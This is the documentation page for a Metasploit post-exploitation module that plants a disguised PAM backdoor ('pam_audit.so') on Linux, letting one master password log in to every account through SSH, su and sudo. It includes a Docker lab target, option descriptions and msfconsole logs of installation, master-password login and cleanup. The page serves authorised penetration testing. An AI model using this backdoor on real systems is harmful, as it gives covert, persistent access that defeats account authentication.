## Vulnerable Application

Any Linux system using PAM (Pluggable Authentication Modules) for authentication is
affected — this includes essentially every modern Linux distribution. The module
requires an existing root session on the target. It installs a malicious PAM shared
library that accepts a configured master password for **any** local account (root,
regular users, service accounts), while leaving existing passwords intact so the
backdoor remains transparent.

Authentication paths covered include SSH, `su`, `sudo`, `login`, and any other
service that routes through PAM. On Debian/Ubuntu, patching `/etc/pam.d/common-auth`
automatically covers all of the above because other PAM configs `@include` it.
On RHEL/Fedora, `/etc/pam.d/system-auth` serves the same role.

A Docker-based test environment is provided below.

### Test Environment (Docker)

Use the following Dockerfile to spin up an Ubuntu 26.04 target
with OpenSSH enabled and a non-root user `user:user`.

```Dockerfile
FROM ubuntu:26.04

RUN apt-get update && \
    apt-get install -y --no-install-recommends openssh-server && \
    rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash user && \
    echo 'user:user' | chpasswd && \
    echo 'root:root' | chpasswd

# Allow root login, password auth, and listen on 2222 (test environment only)
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config && \
    mkdir -p /run/sshd

EXPOSE 2222

CMD ["/usr/sbin/sshd", "-D"]
```

Build and run:

```
docker build -t pam-backdoor-test \
  -f documentation/modules/post/linux/manage/pam_backdoor.Dockerfile .
docker run --rm -p 2222:2222 pam-backdoor-test
```

SSH into the container to confirm it is reachable:

```
ssh -p 2222 user@127.0.0.1   # password: user
```

### Tested On

* Ubuntu 26.04 (Docker image)

## Verification Steps

1. Build and start the Docker test container (see above)
2. Start msfconsole
3. Obtain a root shell session on the target
4. `use post/linux/manage/pam_backdoor`
5. `set SESSION <id>`
6. Optionally: `set BACKDOOR_PASS [password]`
7. `run`
8. From another terminal: `ssh -p 2222 user@127.0.0.1` and enter `[password]` — login succeeds

## Options

### BACKDOOR_PASS

The master password that will be accepted for every account on the target system.
Defaults to a random 20-character alphanumeric string printed after installation.
Maximum length is 63 bytes (limited by the binary placeholder size). Passwords
shorter than 63 bytes are null-padded inside the binary.

### SO_NAME

The filename for the installed PAM shared library. Defaults to `pam_audit.so` to
blend in with legitimate PAM modules. The file is written into the system's PAM
module directory (e.g. `/lib/x86_64-linux-gnu/security/`).

### PAM_CONFIG

Path to the PAM configuration file to patch. Leave blank (the default) for
auto-detection, which checks the following paths in order:

1. `/etc/pam.d/common-auth` (Debian/Ubuntu)
2. `/etc/pam.d/system-auth` (RHEL/Fedora)
3. `/etc/pam.d/system-auth-ac`
4. `/etc/pam.d/sshd`
5. `/etc/pam.d/login`

### ACTION

* `Install` (default) — compile or upload the PAM module and patch the PAM config
* `Cleanup` — remove the `.so` file and strip the backdoor line from the PAM config;
  run with the same `SO_NAME` and `PAM_CONFIG` values used during install

## Scenarios

### Ubuntu 26.04 (Docker) — pre-compiled x86_64 binary (no gcc needed on target)

The test container is running on `127.0.0.1:2222`.

Original (root) shell

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(scanner/ssh/ssh_login) > set rport 2222
rport => 2222
msf auxiliary(scanner/ssh/ssh_login) > set username root
username => root
msf auxiliary(scanner/ssh/ssh_login) > set password root
password => root
msf auxiliary(scanner/ssh/ssh_login) > run
[*] 127.0.0.1:2222        - Starting bruteforce
[*] 127.0.0.1:2222 SSH - Testing User/Pass combinations
[+] 127.0.0.1:2222        - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) Linux 2b3c68517134 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.14-1+kali1 (2026-05-05) x86_64 GNU/Linux '
[*] SSH session 1 opened (127.0.0.1:37297 -> 127.0.0.1:2222) at 2026-05-28 11:24:10 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ssh/ssh_login) > 
```

Post module

```
msf auxiliary(scanner/ssh/ssh_login) > use post/linux/manage/pam_backdoor
[*] Setting default action Install - view all 2 actions with the show actions command
msf post(linux/manage/pam_backdoor) > set session -1
session => -1
msf post(linux/manage/pam_backdoor) > run
[*] Target arch: x86_64
[*] Uploading pre-compiled x86_64 PAM module...
[+] PAM module installed: /lib/x86_64-linux-gnu/security/pam_audit.so
[*] PAM config already contains backdoor entry - skipping patch
[+] Backdoor installed. Master password: 6dm465v2IygLBgS7zVuv
[*] Works with: ssh, su, sudo, login (any PAM-integrated service)
[+] Stored credential for root (shell: /bin/bash)
[+] Stored credential for ubuntu (shell: /bin/bash)
[+] Stored credential for user (shell: /bin/bash)
[+] Stored PAM backdoor credential for 3 user(s) with valid shells
[*] Post module execution completed
msf post(linux/manage/pam_backdoor) > 
msf post(linux/manage/pam_backdoor) > previous
msf auxiliary(scanner/ssh/ssh_login) > set CreateSession false
CreateSession => false
msf auxiliary(scanner/ssh/ssh_login) > set password 6dm465v2IygLBgS7zVuv
password => 6dm465v2IygLBgS7zVuv
msf auxiliary(scanner/ssh/ssh_login) > run
[*] 127.0.0.1:2222        - Starting bruteforce
[*] 127.0.0.1:2222 SSH - Testing User/Pass combinations
[+] 127.0.0.1:2222        - Success: 'root:6dm465v2IygLBgS7zVuv' 'uid=0(root) gid=0(root) groups=0(root) Linux 2b3c68517134 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.14-1+kali1 (2026-05-05) x86_64 GNU/Linux '
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ssh/ssh_login) > set password root
password => root
msf auxiliary(scanner/ssh/ssh_login) > run
[*] 127.0.0.1:2222        - Starting bruteforce
[*] 127.0.0.1:2222 SSH - Testing User/Pass combinations
[+] 127.0.0.1:2222        - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) Linux 2b3c68517134 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.14-1+kali1 (2026-05-05) x86_64 GNU/Linux '
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ssh/ssh_login) > creds
Credentials
===========

id    host       origin     service         public  private               realm  private_type  JtR Format  cracked_password
--    ----       ------     -------         ------  -------               -----  ------------  ----------  ----------------
1236  127.0.0.1  127.0.0.1  2222/tcp (ssh)  root    root                         Password
1237  127.0.0.1  127.0.0.1  2222/tcp (ssh)  root    6dm465v2IygLBgS7zVuv         Password
1238  127.0.0.1  127.0.0.1  2222/tcp (ssh)  ubuntu  6dm465v2IygLBgS7zVuv         Password
1239  127.0.0.1  127.0.0.1  2222/tcp (ssh)  user    6dm465v2IygLBgS7zVuv         Password

msf auxiliary(scanner/ssh/ssh_login) > 
```

Cleanup

```
msf post(linux/manage/pam_backdoor) > set action cleanup
action => cleanup
msf post(linux/manage/pam_backdoor) > run
[+] Removed: /lib/x86_64-linux-gnu/security/pam_audit.so
[*] Max line length is 65537
[*] Writing 1214 bytes in 1 chunks of 4570 bytes (octal-encoded), using printf
[+] PAM config restored: /etc/pam.d/common-auth
[+] Cleanup complete
[*] Post module execution completed
```
